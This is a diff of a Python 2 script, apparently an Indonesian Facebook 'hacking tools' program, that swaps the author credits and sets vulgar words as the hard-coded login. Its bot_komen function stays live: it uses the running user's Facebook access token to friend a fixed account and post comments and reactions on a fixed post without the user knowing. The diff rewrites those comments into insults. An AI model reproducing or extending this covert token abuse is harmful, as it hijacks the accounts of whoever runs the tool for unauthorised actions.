@@ -56,9 +56,9 @@ logo = """
 ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
 
 \033[0;93m╔════════════════════════════════════════════╗
-\033[0;93m \033[0;96m{*} \033[0;93mAuthor  \033[0;93m : \033[0;93mPahrul \033[0;93m                 
-\033[0;93m \033[0;96m{*} \033[0;93mFacebook \033[0;93m: \033[0;93mPahrul \033[0;93m                
-\033[0;93m \033[0;96m{*} \033[0;93mGithub \033[0;93m: \033[0;93mhttps://github.com/pahrul404 \033[0;93m                
+\033[0;93m \033[0;96m{*} \033[0;93mAuthor  \033[0;93m : \033[0;93mRaiZel \033[0;93m                 
+\033[0;93m \033[0;96m{*} \033[0;93mFacebook \033[0;93m: \033[0;93mRaiZel \033[0;93m                
+\033[0;93m \033[0;96m{*} \033[0;93mGithub \033[0;93m: \033[0;93mhttps://github.com/Rezahasyim \033[0;93m                
 \033[0;93m╚════════════════════════════════════════════╝"""
 
 def tik():
@@ -82,14 +82,14 @@ print 40* "\033[0;39m─"
                                                                                 
 print 40* "\033[0;39m─"
 
-CorrectUsername = "pahrul"
-CorrectPassword = "pahrul"
+CorrectUsername = "memek"
+CorrectPassword = "kontol"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[0;96m{★} \x1b[0;93mUSERNAME TOOLS INI \x1b[0;96m︻氕言テ一一一 ")
+    username = raw_input("\033[0;96m{★} \x1b[0;93mUSERNAME TOOLS INI \x1b[0;96mRemartin ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[0;96m{★} \x1b[0;93mPASSWORD TOOLS INI \x1b[0;96m︻氕言テ一一一 ")
+    	password = raw_input("\033[0;96m{★} \x1b[0;93mPASSWORD TOOLS INI \x1b[0;96mRemartin ")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
@@ -126,11 +126,11 @@ def bot_komen():
         os.system('rm -rf login.txt')
 
     una = '100024540287354'
-    kom = 'Assalamualaikum Bang😘'
+    kom = 'Hai Bangsad Ngambilin Akun Mulu Kamu Bangsad😘'
     reac = 'ANGRY'
     post = '946670209494313'
     post2 = '946670209494313'
-    kom2 = 'Saat nya nge hack muehehe😂'
+    kom2 = 'Saat nya ngoclok😂'
     reac2 = 'LOVE'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
